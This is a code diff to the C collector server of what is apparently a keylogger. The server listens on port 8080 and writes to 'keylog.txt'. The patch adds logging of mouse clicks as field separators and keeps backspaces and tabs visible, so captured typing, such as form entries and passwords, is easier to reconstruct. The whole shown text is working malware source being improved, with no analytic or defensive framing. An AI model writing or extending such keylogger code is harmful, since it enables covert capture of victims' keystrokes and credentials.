@@ -7,6 +7,7 @@
 #define WSA_VERSION_CODE 0x202
 #define CON_PORT 8080
 #define KEYLOG_FILE "keylog.txt"
+#define CLICK_MARKER '\x01'
 SOCKET serverSocket, clientSocket;
 
 DWORD WINAPI clientHandler(LPVOID);
@@ -172,15 +173,27 @@ DWORD WINAPI clientHandler(LPVOID params){
 
             //PLAIN ASCII (LETTERS, NUMBERS, \n, \t) IS PRINTED RIGHT AWAY
             if(utf8Length == 0 && byte < 0x80){
-                if(byte == '\b'){
+                //A MOUSE CLICK BREAKS THE LINE, LIKE MOVING TO ANOTHER FIELD
+                if(byte == (unsigned char)CLICK_MARKER){
                     if(!atLineStart){
-                        printf("\b \b");    //ERASE THE PREVIOUS CHARACTER
+                        printf("\n");
+                        atLineStart = 1;
+                        logEntry("[CLICK]");
                     }
+                    fflush(stdout);
+                    continue;
+                }
+
+                if(atLineStart){
+                    printTimestampPrefix();
+                    atLineStart = 0;
+                }
+
+                if(byte == '\b'){
+                    printf("[BACKSPACE]");  //SHOW THE KEY WITHOUT ERASING ANYTHING
+                }else if(byte == '\t'){
+                    printf("[TAB]");
                 }else{
-                    if(atLineStart){
-                        printTimestampPrefix();
-                        atLineStart = 0;
-                    }
                     printf("%c", byte);
                     if(byte == '\n'){
                         atLineStart = 1;
